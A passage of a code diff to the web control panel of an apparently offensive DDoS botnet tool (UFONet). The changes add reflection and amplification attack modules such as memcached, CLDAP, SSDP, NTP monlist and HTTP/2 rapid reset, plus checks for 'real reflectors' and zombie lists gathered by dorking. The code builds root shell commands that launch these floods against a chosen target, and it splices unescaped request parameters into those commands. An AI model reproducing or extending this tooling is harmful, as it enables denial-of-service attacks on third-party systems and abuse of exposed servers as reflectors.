 <td><a href="https://en.wikipedia.org/wiki/Slowloris_(software)" target="_blank">LORIS</a></td>
 <td><a href="https://en.wikipedia.org/wiki/SYN_flood" target="_blank">UFOSYN</a></td>
 <td><a href="https://en.wikipedia.org/wiki/Fraggle_attack" target="_blank">FRAGGLE</a></td>
-<td><a href="https://ddos-guard.net/en/terminology/attack_type/rst-or-fin-flood" target="_blank">UFORST</a></td>
-<td><a href="https://en.wikipedia.org/wiki/DRDOS" target="_blank">SPRAY</a></td>
+<td><a href="https://en.wikipedia.org/wiki/TCP_reset_attack" target="_blank">UFORST</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Denial-of-service_attack#Reflected_attack" target="_blank">SPRAY</a></td>
 <td><a href="https://en.wikipedia.org/wiki/Smurf_attack" target="_blank">SMURF</a></td>
 <td><a href="https://en.wikipedia.org/wiki/Christmas_tree_packet" target="_blank">XMAS</a></td></tr><tr>
 <td><a href="https://en.wikipedia.org/wiki/IP_fragmentation_attack" target="_blank">DROPER</a></td>
-<td><a href="https://www.imperva.com/learn/application-security/snmp-reflection/" target="_blank">SNIPER</a></td>
-<td><a href="https://www.us-cert.gov/ncas/alerts/TA13-088A" target="_blank">TACHYON</a></td>
-<td><a href="https://www.cloudflare.com/learning/ddos/ping-icmp-flood-ddos-attack/" target="_blank">PINGER</a></td>
-<td><a href="https://www.us-cert.gov/ncas/alerts/TA14-013A" target="_blank">MONLIST</a></td>
-<td><a href="https://www.f5.com/services/resources/glossary/push-and-ack-flood" target="_blank">UFOACK</a></td>
-<td><a href="https://cyberhoot.com/cybrary/fragment-overlap-attack/" target="_blank">OVERLAP</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol" target="_blank">SNIPER</a></td>
+<td><a href="https://en.wikipedia.org/wiki/DNS_amplification_attack" target="_blank">TACHYON</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Ping_flood" target="_blank">PINGER</a></td>
+<td><a href="https://en.wikipedia.org/wiki/NTP_server_misuse_and_abuse" target="_blank">MONLIST</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">UFOACK</a></td>
+<td><a href="https://en.wikipedia.org/wiki/IP_fragmentation_attack#Overlapping_fragment_attack" target="_blank">OVERLAP</a></td>
 <td><a href="https://en.wikipedia.org/wiki/UDP_flood_attack" target="_blank">UFOUDP</a></td>
-<td><a href="https://dl.packetstormsecurity.net/papers/general/tcp-starvation.pdf" target="_blank">NUKE</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Sockstress" target="_blank">NUKE</a></td></tr><tr>
+<td><a href="https://en.wikipedia.org/wiki/Memcached" target="_blank">MEMCACHED</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Character_Generator_Protocol" target="_blank">CHARGEN</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol" target="_blank">CLDAP</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Simple_Service_Discovery_Protocol" target="_blank">SSDP</a></td>
+<td><a href="https://en.wikipedia.org/wiki/QOTD" target="_blank">QOTD</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol" target="_blank">TFTP</a></td>
+<td><a href="https://en.wikipedia.org/wiki/WS-Discovery" target="_blank">WSDISCO</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Constrained_Application_Protocol" target="_blank">COAP</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Microsoft_SQL_Server" target="_blank">MSSQL</a></td></tr><tr>
+<td><a href="https://en.wikipedia.org/wiki/Apple_Remote_Desktop" target="_blank">ARMS</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Plex_(software)" target="_blank">PLEX</a></td>
+<td><a href="https://en.wikipedia.org/wiki/NetBIOS" target="_blank">NETBIOS</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Routing_Information_Protocol" target="_blank">RIPV1</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Network_middlebox" target="_blank">MIDDLEBOX</a></td>
+<td><a href="https://en.wikipedia.org/wiki/HTTP/2" target="_blank">RAPIDRESET</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Slowloris_(software)" target="_blank">SLOWREAD</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Denial-of-service_attack#Application-layer_attacks" target="_blank">GOLDENEYE</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_termination" target="_blank">FINFLOOD</a></td>
 </tr></table></td><tr>
 <tr>
 <td><h2><u>GUI-Modules:</u></h2>
@@ -3903,7 +4268,7 @@ function runCommandX(cmd,params) {
                                 if(newcmd=="cmd_list_army"||newcmd=="cmd_list_nodes"||newcmd=="cmd_view_army"||newcmd=="cmd_list_zombies"||newcmd=="cmd_list_aliens"|| newcmd=="cmd_list_droids"||newcmd=="cmd_list_ucavs"||newcmd=="cmd_list_rpcs"||newcmd=="cmd_view_changelog"){ //do not refresh listing army
                                     return;
                                 } else {
-                                if(newcmd=="cmd_test_army" || newcmd=="cmd_download_nodes" || newcmd=="cmd_test_all" || newcmd=="cmd_test_offline" || newcmd=="cmd_test_rpcs" || newcmd=="cmd_attack" || newcmd=="cmd_refresh_blackholes" || newcmd=="cmd_refresh_news" || newcmd=="cmd_refresh_tv" || newcmd=="cmd_refresh_missions" || newcmd=="cmd_sync_grid" || newcmd=="cmd_sync_board" || newcmd=="cmd_sync_wargames" || newcmd=="cmd_sync_links" || newcmd=="cmd_sync_globalnet" || newcmd=="cmd_sync_streams" || newcmd=="cmd_send_message_board" || newcmd=="cmd_transfer_grid" || newcmd=="cmd_transfer_wargame" || newcmd=="cmd_transfer_link" || newcmd=="cmd_transfer_globalnet" || newcmd=="cmd_transfer_stream" || newcmd=="cmd_decrypt" || newcmd=="cmd_decrypt_moderator_board" || newcmd=="cmd_decrypt_grid" || newcmd=="cmd_decrypt_wargames" || newcmd=="cmd_decrypt_links" || newcmd=="cmd_decrypt_globalnet" || newcmd=="cmd_decrypt_streams" || newcmd=="cmd_decrypt_tv" || newcmd=="cmd_inspect" || newcmd=="cmd_abduction" || newcmd=="cmd_download_community" || newcmd=="cmd_upload_community" || newcmd=="cmd_download_botnet_ip" || newcmd=="cmd_upload_botnet_ip" || newcmd=="cmd_attack_me" || newcmd=="cmd_check_tool" || newcmd=="cmd_check_tor" || newcmd=="cmd_edit_supply" || newcmd=="cmd_job_remove" || newcmd=="cmd_job_remove_all" || newcmd=="cmd_job_add" || newcmd =="cmd_job_add_all" || newcmd=="cmd_job_cancel" || newcmd=="cmd_job_cancel_all" || newcmd=="cmd_job_filter" || newcmd=="cmd_link_filter" || newcmd=="cmd_globalnet_filter" || newcmd=="cmd_stream_filter" || newcmd=="cmd_grid_filter" || newcmd=="cmd_search") newcmd=newcmd+"_update"
+                                if(newcmd=="cmd_test_army" || newcmd=="cmd_download_nodes" || newcmd=="cmd_test_all" || newcmd=="cmd_test_offline" || newcmd=="cmd_test_rpcs" || newcmd=="cmd_attack" || newcmd=="cmd_refresh_blackholes" || newcmd=="cmd_refresh_news" || newcmd=="cmd_refresh_tv" || newcmd=="cmd_refresh_missions" || newcmd=="cmd_sync_grid" || newcmd=="cmd_sync_board" || newcmd=="cmd_sync_wargames" || newcmd=="cmd_sync_links" || newcmd=="cmd_sync_globalnet" || newcmd=="cmd_sync_streams" || newcmd=="cmd_send_message_board" || newcmd=="cmd_transfer_grid" || newcmd=="cmd_transfer_wargame" || newcmd=="cmd_transfer_link" || newcmd=="cmd_transfer_globalnet" || newcmd=="cmd_transfer_stream" || newcmd=="cmd_decrypt" || newcmd=="cmd_decrypt_moderator_board" || newcmd=="cmd_decrypt_grid" || newcmd=="cmd_decrypt_wargames" || newcmd=="cmd_decrypt_links" || newcmd=="cmd_decrypt_globalnet" || newcmd=="cmd_decrypt_streams" || newcmd=="cmd_decrypt_tv" || newcmd=="cmd_inspect" || newcmd=="cmd_abduction" || newcmd=="cmd_download_botnet_ip" || newcmd=="cmd_upload_botnet_ip" || newcmd=="cmd_attack_me" || newcmd=="cmd_check_tool" || newcmd=="cmd_check_tor" || newcmd=="cmd_edit_supply" || newcmd=="cmd_job_remove" || newcmd=="cmd_job_remove_all" || newcmd=="cmd_job_add" || newcmd =="cmd_job_add_all" || newcmd=="cmd_job_cancel" || newcmd=="cmd_job_cancel_all" || newcmd=="cmd_job_filter" || newcmd=="cmd_link_filter" || newcmd=="cmd_globalnet_filter" || newcmd=="cmd_stream_filter" || newcmd=="cmd_grid_filter" || newcmd=="cmd_search") newcmd=newcmd+"_update"
 								//do not refresh if certain text on response is found
 								if(newcmd.match(/update/) && 
 										(
@@ -3953,8 +4318,14 @@ function runCommandX(cmd,params) {
                 if path[start+1:start+7] == "target":
                     params['target']=path[start+8:]
                     return params
+                if path[start+1:start+10] == "fetchdoll":
+                    params['fetchdoll']=urllib.parse.unquote(path[start+11:])
+                    return params
+                if path[start+1:start+5] == "doll":
+                    params['doll']=urllib.parse.unquote(path[start+6:])
+                    return params
                 for param in path[start+1:].split("&"):
-                    f = param.split("=")
+                    f = param.split("=", 1)
                     if len(f) == 2:
                         var = f[0]
                         value = f[1]
@@ -4098,8 +4469,88 @@ function runCommandX(cmd,params) {
                      data = f.read()
                      self.pages[page]=data
             elif page == "/js/ajax.js":
-                from .ajaxmap import AjaxMap
-                self.pages[page] = AjaxMap().ajax(pGet)
+                global _AJAX_MAP_CACHE
+                if _AJAX_MAP_CACHE is None:
+                    from .ajaxmap import AjaxMap
+                    import io, contextlib
+                    _buf = io.StringIO()
+                    with contextlib.redirect_stdout(_buf), contextlib.redirect_stderr(_buf):
+                        _AJAX_MAP_CACHE = AjaxMap()
+                self.pages[page] = _AJAX_MAP_CACHE.ajax(pGet)
+        if page == "/cmd_mods_status":
+            from core._botnet import is_placeholder as _is_ph_s
+            def _cr(fp):
+                try:
+                    with open(fp) as _f:
+                        return sum(1 for _l in _f if _l.strip() and not _is_ph_s(_l.strip()))
+                except Exception:
+                    return 0
+            _ref = {
+                "memcached": "botnet/memcached.txt", "chargen": "botnet/chargen.txt",
+                "cldap": "botnet/cldap.txt", "ssdp": "botnet/ssdp.txt",
+                "qotd": "botnet/qotd.txt", "tftp": "botnet/tftp.txt",
+                "wsdisco": "botnet/wsdisco.txt", "coap": "botnet/coap.txt",
+                "mssql": "botnet/mssql.txt", "arms": "botnet/arms.txt",
+                "plex": "botnet/plex.txt", "netbios": "botnet/netbios.txt",
+                "ripv1": "botnet/ripv1.txt", "middlebox": "botnet/middlebox.txt",
+                "tachyon": "botnet/dns.txt", "monlist": "botnet/ntp.txt",
+                "sniper": "botnet/snmp.txt",
+            }
+            self.pages["/cmd_mods_status"] = " ".join(_n+"="+str(_cr(_p)) for _n,_p in _ref.items())
+        if page == "/cmd_army_check":
+            from core._botnet import is_placeholder as _is_ph
+            def _count_real(fp):
+                try:
+                    with open(fp) as _f:
+                        return sum(1 for _l in _f if _l.strip() and not _is_ph(_l.strip()))
+                except Exception:
+                    return 0
+            _mode = pGet.get("mod_only", "off")
+            _mod_files = {
+                "memcached": "botnet/memcached.txt", "chargen": "botnet/chargen.txt",
+                "cldap": "botnet/cldap.txt", "ssdp": "botnet/ssdp.txt",
+                "qotd": "botnet/qotd.txt", "tftp": "botnet/tftp.txt",
+                "wsdisco": "botnet/wsdisco.txt", "coap": "botnet/coap.txt",
+                "mssql": "botnet/mssql.txt", "arms": "botnet/arms.txt",
+                "plex": "botnet/plex.txt", "netbios": "botnet/netbios.txt",
+                "ripv1": "botnet/ripv1.txt", "middlebox": "botnet/middlebox.txt",
+                "tachyon": "botnet/dns.txt", "monlist": "botnet/ntp.txt",
+                "sniper": "botnet/snmp.txt",
+            }
+            _http_only = {"loic", "loris", "slowread", "goldeneye", "rapidreset", "finflood",
+                          "ufosyn", "xmas", "nuke", "ufoack", "uforst", "droper", "overlap",
+                          "pinger", "ufoudp", "spray", "smurf", "fraggle", "dbstress"}
+            if _mode != "on":
+                _real = _count_real(self.zombies_file)
+                self.pages["/cmd_army_check"] = "ok" if _real > 0 else "err=No real entries in botnet/zombies.txt. Populate via dorking: ./ufonet -s 'page.php?url='"
+            else:
+                _missing = []
+                _has_any = False
+                for _name in list(_mod_files.keys()) + list(_http_only):
+                    _v = pGet.get(_name, "0")
+                    try:
+                        _vn = int(_v) if _v else 0
+                    except Exception:
+                        _vn = 0
+                    if _vn <= 0 and _name != "dbstress":
+                        continue
+                    if _name == "dbstress" and not _v:
+                        continue
+                    if _name in _http_only:
+                        _has_any = True
+                        continue
+                    _fp = _mod_files[_name]
+                    if _count_real(_fp) > 0:
+                        _has_any = True
+                    else:
+                        _missing.append(_name)
+                if _has_any:
+                    self.pages["/cmd_army_check"] = "ok"
+                else:
+                    if _missing:
+                        self.pages["/cmd_army_check"] = "err=Selected mods have no real reflectors: " + ", ".join(_missing) + ". Populate botnet/<mod>.txt with real IPs."
+                    else:
+                        self.pages["/cmd_army_check"] = "err=No Extra(s) selected"
         if page == "/cmd_check_tool":
             self.pages["/cmd_check_tool"] = "<pre>Waiting for updates results...</pre>"
             runcmd = "("+python_version+" -i ufonet --update |tee /tmp/out) &"
@@ -4162,7 +4613,8 @@ function runCommandX(cmd,params) {
             if num_globalnet == 0:
                 ip_g = "-"
             total_nodes = str(num_blackholes + num_globalnet)
-            self.pages["/cmd_list_nodes"] = "<pre><h1>Total Nodes = "+str(total_nodes)+"</h1><br /><div id='infovis'></div><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u><a href='/radar' target='_blank'>GLOBAL.RADAR:</u></a> <b>"+str(num_globalnet)+"</b></td><td><h3><u><a href='/blackholes' target='_blank'>SHIP.WARPS:</u></a> <b>"+str(num_blackholes)+"</b></td></tr><tr><td></h3>"+'\n'.join(self.decrypted_globalnet)+"</td><td></h3>"+'\n'.join(self.decrypted_blackholes)+"</td></tr></table><br /><br/>"
+            linked_blackholes = ['<a href="http://' + ip + '" target="_blank">' + ip + '</a>' for ip in self.decrypted_blackholes]
+            self.pages["/cmd_list_nodes"] = "<pre><h1>Total Nodes = "+str(total_nodes)+"</h1><br /><div id='infovis'></div><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u style=\"text-decoration: underline red;\"><a href='/radar' target='_blank'>GLOBAL.RADAR:</a></u> <b>"+str(num_globalnet)+"</b></td><td><h3><u style=\"text-decoration: underline red;\"><a href='/blackholes' target='_blank'>SHIP.WARPS:</a></u> <b>"+str(num_blackholes)+"</b></td></tr><tr><td></h3>"+'\n'.join(self.decrypted_globalnet)+"</td><td></h3>"+'\n'.join(linked_blackholes)+"</td></tr></table><br /><br/>"
         if page == "/cmd_list_zombies":
             self.pages["/cmd_list_zombies"] = "<pre><h1>Total Zombies = "+self.num_zombies+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Zombies:</u> <b>"+self.num_zombies+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.zombies_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_zombies)+"</td><td></h3>"+'\n'.join(self.zombies)+"</td></tr></table><br /><br/>"
         if page == "/cmd_list_aliens":
@@ -4210,14 +4662,6 @@ function runCommandX(cmd,params) {
                 open('/tmp/out', 'w').close()
             with open('/tmp/out', 'r') as f:
                 self.pages["/cmd_attack_me_update"] = "<pre>"+f.read()+"<pre>"
-        if page == "/cmd_download_community":
-            self.pages["/cmd_download_community"] = "<pre>Waiting for downloading results...</pre>"
-            runcmd = "("+python_version+" -i ufonet --download-zombies "+ cmd_options + "|tee /tmp/out) &"
-        if page == "/cmd_download_community_update":
-            if not os.path.exists('/tmp/out'):
-                open('/tmp/out', 'w').close()
-            with open('/tmp/out', 'r') as f:
-                self.pages["/cmd_download_community_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_download_botnet_ip":
             blackhole = pGet["blackhole"]
             blackhole=urllib.parse.unquote(blackhole)
@@ -4228,14 +4672,6 @@ function runCommandX(cmd,params) {
                 open('/tmp/out', 'w').close()
             with open('/tmp/out', 'r') as f:
                 self.pages["/cmd_download_botnet_ip_update"] = "<pre>"+f.read()+"<pre>"
-        if page == "/cmd_upload_community":
-            self.pages["/cmd_upload_community"] = "<pre>Waiting for uploading results...</pre>"
-            runcmd = "("+python_version+" -i ufonet --upload-zombies "+ cmd_options + "|tee /tmp/out) &"
-        if page == "/cmd_upload_community_update":
-            if not os.path.exists('/tmp/out'):
-                open('/tmp/out', 'w').close()
-            with open('/tmp/out', 'r') as f:
-                self.pages["/cmd_upload_community_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_upload_botnet_ip":
             blackhole = pGet["blackhole"]
             blackhole=urllib.parse.unquote(blackhole)
@@ -4289,8 +4725,13 @@ function runCommandX(cmd,params) {
             flag_ufoudp = None
             target = pGet["target"].replace(" ","/")
             target=urllib.parse.unquote(target)
-            nonroot_cmd = "("+python_version+" -i ufonet -a '"+target+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
-            root_cmd = "(sudo "+python_version+" -i ufonet -a '"+target+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
+            mod_only = pGet.get("mod_only", "off") == "on"
+            if mod_only:
+                nonroot_cmd = "("+python_version+" -i ufonet -m '"+target+"' "
+                root_cmd = "(sudo "+python_version+" -i ufonet -m '"+target+"' "
+            else:
+                nonroot_cmd = "("+python_version+" -i ufonet -a '"+target+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
+                root_cmd = "(sudo "+python_version+" -i ufonet -a '"+target+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
             end_cmd = ""+cmd_options + "|tee /tmp/out) &"
             if pGet["dbstress"]:
                 cmd += "--db '" +str(pGet["dbstress"])+ "' "
@@ -4343,10 +4784,15 @@ function runCommandX(cmd,params) {
             if pGet["ufoudp"]:
                 cmd += "--ufoudp '" +str(pGet["ufoudp"])+ "' "
                 flag_ufoudp = True
-            if not flag_monlist and not flag_tachyon and not flag_nuke and not flag_xmas and not flag_smurf and not flag_spray and not flag_ufosyn and not flag_fraggle and not flag_sniper and not flag_ufoack and not flag_uforst and not flag_droper and not flag_overlap and not flag_pinger and not flag_ufoudp:
-                cmd = nonroot_cmd + cmd # non root required (LOIC, LORIS)
-            if flag_ufosyn == True or flag_spray == True or flag_smurf == True or flag_xmas == True or flag_nuke == True or flag_tachyon == True or flag_monlist == True or flag_fraggle == True or flag_sniper == True or flag_ufoack == True or flag_uforst == True or flag_droper == True or flag_overlap == True or flag_pinger == True or flag_ufoudp == True:
-                cmd = root_cmd + cmd # root required (UFOSYN, SPRAY, SMURF, XMAS, NUKE, TACHYON, MONLIST, FRAGGLE, SNIPER, UFOACK, UFORST, DROPER, OVERLAP, PINGER, UFOUDP)                    
+            flag_newmod = False
+            for _m in ("memcached","chargen","cldap","ssdp","qotd","tftp","wsdisco","coap","mssql","arms","plex","netbios","ripv1","middlebox","rapidreset","slowread","finflood"):
+                if pGet.get(_m):
+                    cmd += "--"+_m+" '"+str(pGet[_m])+"' "
+                    flag_newmod = True
+            if pGet.get("goldeneye"):
+                cmd += "--goldeneye '"+str(pGet["goldeneye"])+"' "
+            need_root = any([flag_ufosyn, flag_spray, flag_smurf, flag_xmas, flag_nuke, flag_tachyon, flag_monlist, flag_fraggle, flag_sniper, flag_ufoack, flag_uforst, flag_droper, flag_overlap, flag_pinger, flag_ufoudp, flag_newmod])
+            cmd = (root_cmd if need_root else nonroot_cmd) + cmd
             runcmd = cmd + end_cmd
         if page == "/cmd_attack_update":
             if not os.path.exists('/tmp/out'):
@@ -4700,6 +5146,24 @@ function runCommandX(cmd,params) {
                 supply_botnet = pGet["botnet"]
                 supply_loic = pGet["loic"]
                 supply_loris = pGet["loris"]
+                supply_memcached = pGet.get("memcached", "0")
+                supply_chargen = pGet.get("chargen", "0")
+                supply_cldap = pGet.get("cldap", "0")
+                supply_ssdp = pGet.get("ssdp", "0")
+                supply_qotd = pGet.get("qotd", "0")
+                supply_tftp = pGet.get("tftp", "0")
+                supply_wsdisco = pGet.get("wsdisco", "0")
+                supply_coap = pGet.get("coap", "0")
+                supply_mssql = pGet.get("mssql", "0")
+                supply_arms = pGet.get("arms", "0")
+                supply_plex = pGet.get("plex", "0")
+                supply_netbios = pGet.get("netbios", "0")
+                supply_ripv1 = pGet.get("ripv1", "0")
+                supply_middlebox = pGet.get("middlebox", "0")
+                supply_rapidreset = pGet.get("rapidreset", "0")
+                supply_slowread = pGet.get("slowread", "0")
+                supply_goldeneye = pGet.get("goldeneye", "0")
+                supply_finflood = pGet.get("finflood", "0")
                 supply_ufosyn = pGet["ufosyn"]
                 supply_spray = pGet["spray"]
                 supply_smurf = pGet["smurf"]
@@ -4719,6 +5183,24 @@ function runCommandX(cmd,params) {
                 supply_botnet = 1
                 supply_loic = 0
                 supply_loris = 0
+                supply_memcached = 0
+                supply_chargen = 0
+                supply_cldap = 0
+                supply_ssdp = 0
+                supply_qotd = 0
+                supply_tftp = 0
+                supply_wsdisco = 0
+                supply_coap = 0
+                supply_mssql = 0
+                supply_arms = 0
+                supply_plex = 0
+                supply_netbios = 0
+                supply_ripv1 = 0
+                supply_middlebox = 0
+                supply_rapidreset = 0
+                supply_slowread = 0
+                supply_goldeneye = 0
+                supply_finflood = 0
                 supply_ufosyn = 0
                 supply_spray = 0
                 supply_smurf = 0
@@ -4735,7 +5217,7 @@ function runCommandX(cmd,params) {
                 supply_pinger = 0
                 supply_ufoudp = 0
             with open(self.mothership_supplycfg_file, "w") as f:
-                json.dump({"botnet": supply_botnet, "loic": supply_loic, "loris": supply_loris, "ufosyn": supply_ufosyn, "spray": supply_spray, "smurf": supply_smurf, "xmas": supply_xmas, "nuke": supply_nuke, "tachyon": supply_tachyon, "monlist": supply_monlist, "fraggle": supply_fraggle, "sniper": supply_sniper, "ufoack": supply_ufoack, "uforst": supply_uforst, "droper": supply_droper, "overlap": supply_overlap, "pinger": supply_pinger, "ufoudp": supply_ufoudp}, f, indent=4)
+                json.dump({"botnet": supply_botnet, "loic": supply_loic, "loris": supply_loris, "ufosyn": supply_ufosyn, "spray": supply_spray, "smurf": supply_smurf, "xmas": supply_xmas, "nuke": supply_nuke, "tachyon": supply_tachyon, "monlist": supply_monlist, "fraggle": supply_fraggle, "sniper": supply_sniper, "ufoack": supply_ufoack, "uforst": supply_uforst, "droper": supply_droper, "overlap": supply_overlap, "pinger": supply_pinger, "ufoudp": supply_ufoudp, "memcached": supply_memcached, "chargen": supply_chargen, "cldap": supply_cldap, "ssdp": supply_ssdp, "qotd": supply_qotd, "tftp": supply_tftp, "wsdisco": supply_wsdisco, "coap": supply_coap, "mssql": supply_mssql, "arms": supply_arms, "plex": supply_plex, "netbios": supply_netbios, "ripv1": supply_ripv1, "middlebox": supply_middlebox, "rapidreset": supply_rapidreset, "slowread": supply_slowread, "goldeneye": supply_goldeneye, "finflood": supply_finflood}, f, indent=4)
         if page == "/cmd_job_add":
             self.pages["/cmd_job_add"] = "<pre>Adding wargame to your list...</pre>"
             try:
@@ -6062,13 +6544,19 @@ function runCommandX(cmd,params) {
                     if self.encryptedtext:
                         ufoudp = self.encryptedtext
                     self.encryptedtext = "" # clean encryptedtext buffer
+                    _new_vals = {}
+                    for _name in ('memcached','chargen','cldap','ssdp','qotd','tftp','wsdisco','coap','mssql','arms','plex','netbios','ripv1','middlebox','slowread','goldeneye','rapidreset','finflood'):
+                        _v = stats_data.get(_name, 0)
+                        self.encrypt(grid_key, str(_v))
+                        _new_vals[_name] = self.encryptedtext if self.encryptedtext else _v
+                        self.encryptedtext = ""
                     contact = grid_data["grid_contact"].encode('utf-8')
                     self.encrypt(grid_key, str(contact))
                     if self.encryptedtext:
                         contact = self.encryptedtext
-                    self.encryptedtext = "" # clean encryptedtext buffer  
+                    self.encryptedtext = "" # clean encryptedtext buffer
                     id = grid_data["grid_token"] #  plain text
-                    stream = str(nickname)+grid_msg_sep+str(ranking)+grid_msg_sep+str(chargo)+grid_msg_sep+str(dorking)+grid_msg_sep+str(transferred)+grid_msg_sep+str(max_chargo)+grid_msg_sep+str(missions)+grid_msg_sep+str(attacks)+grid_msg_sep+str(loic)+grid_msg_sep+str(loris)+grid_msg_sep+str(ufosyn)+grid_msg_sep+str(spray)+grid_msg_sep+str(smurf)+grid_msg_sep+str(xmas)+grid_msg_sep+str(nuke)+grid_msg_sep+str(tachyon)+grid_msg_sep+str(monlist)+grid_msg_sep+str(fraggle)+grid_msg_sep+str(sniper)+grid_msg_sep+str(ufoack)+grid_msg_sep+str(uforst)+grid_msg_sep+str(droper)+grid_msg_sep+str(overlap)+grid_msg_sep+str(pinger)+grid_msg_sep+str(ufoudp)+grid_msg_sep+str(contact)+grid_msg_sep+str(id)
+                    stream = str(nickname)+grid_msg_sep+str(ranking)+grid_msg_sep+str(chargo)+grid_msg_sep+str(dorking)+grid_msg_sep+str(transferred)+grid_msg_sep+str(max_chargo)+grid_msg_sep+str(missions)+grid_msg_sep+str(attacks)+grid_msg_sep+str(loic)+grid_msg_sep+str(loris)+grid_msg_sep+str(ufosyn)+grid_msg_sep+str(spray)+grid_msg_sep+str(smurf)+grid_msg_sep+str(xmas)+grid_msg_sep+str(nuke)+grid_msg_sep+str(tachyon)+grid_msg_sep+str(monlist)+grid_msg_sep+str(fraggle)+grid_msg_sep+str(sniper)+grid_msg_sep+str(ufoack)+grid_msg_sep+str(uforst)+grid_msg_sep+str(droper)+grid_msg_sep+str(overlap)+grid_msg_sep+str(pinger)+grid_msg_sep+str(ufoudp)+grid_msg_sep+str(_new_vals['memcached'])+grid_msg_sep+str(_new_vals['chargen'])+grid_msg_sep+str(_new_vals['cldap'])+grid_msg_sep+str(_new_vals['ssdp'])+grid_msg_sep+str(_new_vals['qotd'])+grid_msg_sep+str(_new_vals['tftp'])+grid_msg_sep+str(_new_vals['wsdisco'])+grid_msg_sep+str(_new_vals['coap'])+grid_msg_sep+str(_new_vals['mssql'])+grid_msg_sep+str(_new_vals['arms'])+grid_msg_sep+str(_new_vals['plex'])+grid_msg_sep+str(_new_vals['netbios'])+grid_msg_sep+str(_new_vals['ripv1'])+grid_msg_sep+str(_new_vals['middlebox'])+grid_msg_sep+str(_new_vals['slowread'])+grid_msg_sep+str(_new_vals['goldeneye'])+grid_msg_sep+str(_new_vals['rapidreset'])+grid_msg_sep+str(_new_vals['finflood'])+grid_msg_sep+str(contact)+grid_msg_sep+str(id)
                     try: 
                         host = blackhole_ip
                         cport = 9992 # port used by mothership grider (server side script)
@@ -6370,16 +6858,15 @@ function runCommandX(cmd,params) {
             if len(globalnet_comment) < 3 or len(globalnet_comment) > 90: # default comment
                 globalnet_comment = "-"
             globalnet_warp = pGet["globalnet_warp"]
-            try:
-                globalnet_ip = requests.get(check_ip_service3).text
-            except:
+            globalnet_ip = "Unknown!"
+            for _svc in (check_ip_service1, check_ip_service2, check_ip_service3):
                 try:
-                    globalnet_ip = requests.get(check_ip_service2).text
-                except:
-                    try:
-                        globalnet_ip = requests.get(check_ip_service1).text
-                    except:
-                        globalnet_ip = "Unknown!"
+                    _txt = requests.get(_svc, timeout=5).text.strip()
+                    if re.match(r'^\d+\.\d+\.\d+\.\d+$', _txt):
+                        globalnet_ip = _txt
+                        break
+                except Exception:
+                    continue
             if blackhole_flag == False: # only add NEW blackholes/IPs into the list
                 if globalnet_enckey != "": # stream creation + encryption + package send
                     try:
@@ -6785,19 +7272,38 @@ function runCommandX(cmd,params) {
                 mothership_overlap = 0
                 mothership_pinger = 0
                 mothership_ufoudp = 0
+                mothership_memcached = 0
+                mothership_chargen = 0
+                mothership_cldap = 0
+                mothership_ssdp = 0
+                mothership_qotd = 0
+                mothership_tftp = 0
+                mothership_wsdisco = 0
+                mothership_coap = 0
+                mothership_mssql = 0
+                mothership_arms = 0
+                mothership_plex = 0
+                mothership_netbios = 0
+                mothership_ripv1 = 0
+                mothership_middlebox = 0
+                mothership_slowread = 0
+                mothership_goldeneye = 0
+                mothership_rapidreset = 0
+                mothership_finflood = 0
                 mothership_chargo = 0
                 mothership_dorking = 0
                 mothership_maxchargo = 0
                 nodec_text = "KEY?"
-                grid_table = "<center><u>MEMBERS STATS:</u></center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_nickname' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('nickname','"+str(grid_key)+"')>NICK:</a></td><td align='center'><a id='filter_ranking' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ranking','"+str(grid_key)+"')>RANK:</a></td><td align='center'><a id='filter_chargo' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('chargo','"+str(grid_key)+"')>CHARGO:</a></td><td align='center'><a id='filter_dorking' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('dorking','"+str(grid_key)+"')>DORKING:</a></td><td align='center'><a id='filter_transf' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('transferred','"+str(grid_key)+"')>TRANSF:</a></td><td align='center'><a id='filter_maxchargo' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('maxchargo','"+str(grid_key)+"')>MAX.CHARGO:</a></td><td align='center'><a id='filter_missions' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('missions','"+str(grid_key)+"')>MISSIONS:</a></td><td align='center'><a id='filter_attacks' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('attacks','"+str(grid_key)+"')>ATTACKS:</a></td><td align='center'><a id='filter_loic' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('loic','"+str(grid_key)+"')>LOIC:</a></td><td align='center'><a id='filter_loris' style='color:red;text-decoration:underline red;' 